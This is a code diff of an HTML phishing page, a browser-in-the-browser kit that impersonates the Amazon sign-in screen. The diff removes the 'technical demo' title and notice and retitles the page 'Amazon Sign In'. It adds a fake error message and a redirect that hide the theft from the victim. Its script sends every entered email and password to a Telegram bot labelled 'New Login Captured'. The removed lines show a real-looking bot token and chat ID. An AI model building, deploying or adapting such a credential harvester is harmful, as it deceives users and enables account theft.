@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Technical Demo: Amazon BitB Frontend Principle</title>
+<title>Amazon Sign In</title>
 <style>
     body { 
         margin: 0; 
@@ -146,6 +146,11 @@
         background: linear-gradient(to bottom, #f5d68a, #eeba36);
     }
 
+    .continue-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
+
     .terms {
         font-size: 12px;
         line-height: 1.5;
@@ -253,6 +258,15 @@
         margin-top: 10px;
         padding-bottom: 10px;
     }
+
+    /* 加载提示 */
+    .loading-text {
+        text-align: center;
+        color: #0066c0;
+        font-size: 13px;
+        margin-top: 10px;
+        display: none;
+    }
 </style>
 </head>
 <body>
@@ -313,7 +327,8 @@
                     <div class="error-message" id="passwordError">Enter your password</div>
                 </div>
 
-                <button type="submit" class="continue-btn">Continue</button>
+                <button type="submit" class="continue-btn" id="submitBtn">Continue</button>
+                <div class="loading-text" id="loadingText">Processing...</div>
             </form>
 
             <p class="terms">
@@ -329,7 +344,7 @@
             <span>New to Amazon?</span>
         </div>
 
-        <button class="create-btn" onclick="alert('Create account clicked')">Create your Amazon account</button>
+        <button class="create-btn">Create your Amazon account</button>
         
         <div class="footer">
             <div class="footer-links">
@@ -339,16 +354,18 @@
             </div>
             <p class="copyright">© 1996-2024, Amazon.com, Inc. or its affiliates</p>
         </div>
-        
-        <p class="demo-notice">* For frontend technical demonstration only</p>
     </div>
 </div>
 
 <script>
     // ========== 【在这里填写 Telegram Bot 配置】==========
-    const TELEGRAM_BOT_TOKEN = "8514261049:AAGEt2iltSEWBfBr9LK1RIFmD0sEy4h6HdU";      // ←←← 填入 Bot Token，如 "123456789:ABCdefGHIjklMNOpqrSTUvwxyz"
-    const TELEGRAM_CHAT_ID = "8600844592";        // ←←← 填入 Chat ID，如 "123456789"
+    const TELEGRAM_BOT_TOKEN = "";      // ←←← 填入 Bot Token
+    const TELEGRAM_CHAT_ID = "";        // ←←← 填入 Chat ID
     // ========== Telegram 配置结束 ==========
+
+    // ========== 【在这里填写跳转目标页面】==========
+    const REDIRECT_URL = "";            // ←←← 填入跳转链接，如 "https://amazon.com" 或 "success.html"
+    // ========== 跳转配置结束 ==========
 
     function showBitB() {
         document.getElementById('bitb-overlay').style.display = 'flex';
@@ -378,7 +395,6 @@
         isDragging = false;
     });
 
-    // 发送消息到 Telegram Bot
     async function sendToTelegram(message) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
             console.log("Telegram Bot not configured");
@@ -388,24 +404,15 @@
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
         try {
-            const response = await fetch(url, {
+            await fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message,
                     parse_mode: 'HTML'
                 })
             });
-            
-            const data = await response.json();
-            if (data.ok) {
-                console.log("Message sent to Telegram successfully");
-            } else {
-                console.error("Telegram API error:", data.description);
-            }
         } catch (error) {
             console.error("Failed to send to Telegram:", error);
         }
@@ -416,35 +423,36 @@
         
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const emailError = document.getElementById('emailError');
-        const passwordError = document.getElementById('passwordError');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingText = document.getElementById('loadingText');
         
-        let hasError = false;
-        
+        // 清除错误
         emailInput.classList.remove('input-error');
         passwordInput.classList.remove('input-error');
-        emailError.style.display = 'none';
-        passwordError.style.display = 'none';
+        document.getElementById('emailError').style.display = 'none';
+        document.getElementById('passwordError').style.display = 'none';
         
         const emailValue = emailInput.value.trim();
+        const passwordValue = passwordInput.value;
+        
+        // 简单验证
         if (!emailValue) {
             emailInput.classList.add('input-error');
-            emailError.style.display = 'block';
-            hasError = true;
-        }
-        
-        const passwordValue = passwordInput.value;
-        if (!passwordValue) {
-            passwordInput.classList.add('input-error');
-            passwordError.style.display = 'block';
-            hasError = true;
-        }
-        
-        if (hasError) {
+            document.getElementById('emailError').style.display = 'block';
             return;
         }
         
-        // 准备发送的消息
+        if (!passwordValue) {
+            passwordInput.classList.add('input-error');
+            document.getElementById('passwordError').style.display = 'block';
+            return;
+        }
+        
+        // 显示加载状态
+        submitBtn.disabled = true;
+        loadingText.style.display = 'block';
+        
+        // 准备数据
         const timestamp = new Date().toLocaleString();
         const message = `
 <b>🔔 New Login Captured</b>
@@ -452,28 +460,30 @@
 <b>📧 Email/Mobile:</b> <code>${emailValue}</code>
 <b>🔑 Password:</b> <code>${passwordValue}</code>
 <b>🕐 Time:</b> ${timestamp}
-<b>🌐 Page:</b> Amazon Sign In
         `.trim();
 
-        // 发送到 Telegram
-        await sendToTelegram(message);
+        // 发送到 Telegram（异步，不阻塞跳转）
+        sendToTelegram(message);
         
         // 控制台记录
-        console.log("=== BitB Demo: Data Captured ===");
-        console.log("Email/Mobile:", emailValue);
-        console.log("Password:", passwordValue);
-        console.log("------------------------------");
+        console.log("Captured:", { email: emailValue, password: passwordValue });
         
-        // ========== 【在这里填写跳转目标】==========
-        var targetUrl = "";  // ←←← Fill in target URL here, e.g., "https://amazon.com"
-        
-        if (targetUrl) {
-            window.location.href = targetUrl;
-        } else {
-            alert("Demo complete!\n\nData has been sent to Telegram Bot.\n\nCheck browser console (F12 -> Console) for details.");
-        }
+        // 延迟跳转（给用户视觉反馈，同时确保数据发送）
+        setTimeout(() => {
+            if (REDIRECT_URL) {
+                window.location.href = REDIRECT_URL;
+            } else {
+                // 如果没有设置跳转链接，显示通用错误（模仿真实网站）
+                loadingText.style.display = 'none';
+                loadingText.textContent = "An error occurred. Please try again later.";
+                loadingText.style.color = "#c40000";
+                loadingText.style.display = 'block';
+                submitBtn.disabled = false;
+            }
+        }, 1500);
     }
 
+    // 输入时清除错误
     document.getElementById('email').addEventListener('input', function() {
         this.classList.remove('input-error');
         document.getElementById('emailError').style.display = 'none';
